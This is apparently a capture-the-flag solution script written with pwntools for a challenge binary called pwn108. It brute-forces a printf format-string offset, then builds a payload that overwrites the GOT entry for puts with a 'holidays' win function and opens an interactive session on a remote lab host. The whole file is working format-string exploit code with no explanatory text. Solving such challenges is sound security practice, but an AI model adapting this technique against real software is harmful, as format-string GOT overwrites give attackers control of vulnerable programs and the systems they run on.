from pwn import *

PROGRAM = './pwn108-1644300489260.pwn108'
context.binary = e = ELF(PROGRAM)
# io = process(PROGRAM)
io = remote('10.49.172.31', '9008')

def find_offset(): #OFFSET IS AT 10
    # context.log_level = 'error'
    i = 0
    while 1:
        proc = process(PROGRAM)        
        proc.recvuntil(b': ')
        proc.sendline(b'AAAA')
        proc.recvuntil(b': ')
        payload = f'AAAAAAAA%{i}$p'

        proc.sendline(payload.encode())
        proc.recvuntil(b'no  : ')
        res = proc.recvline().strip()

        if b"AAAAAAAA0x4141414141414141" == res:
            break

        i += 1
    return i

win = e.symbols['holidays']
puts = e.got['puts']

offset = find_offset()
log.info(f"Offset found: {offset}")

payload_writes = {
    e.got['puts']: e.symbols['holidays']
}

payload = fmtstr_payload(offset, payload_writes, write_size='short')

io.recvuntil(b': ')
io.sendline(b'AAAA')
io.recvuntil(b': ')
io.sendline(payload)
io.interactive()